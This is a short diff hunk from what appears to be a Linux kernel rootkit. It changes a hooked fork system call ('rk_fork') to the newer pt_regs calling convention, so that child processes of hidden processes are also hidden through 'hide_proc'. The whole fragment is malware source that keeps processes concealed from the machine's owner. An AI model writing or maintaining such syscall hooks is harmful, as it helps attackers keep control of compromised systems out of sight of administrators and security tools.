@@ -74,9 +74,9 @@ asmlinkage long rk_clone(unsigned long a, unsigned long b, int __user *c, unsign
     return i;
 }
 
-asmlinkage long rk_fork(void)
+asmlinkage long rk_fork(const struct pt_regs *pt_regs)
 {
-    long i = orig_fork();
+    long i = orig_fork(pt_regs);
     if (is_hidden_proc(current->pid))
         hide_proc(i);
     // FM_INFO("fork from %d to %ld\n", current->pid, i);
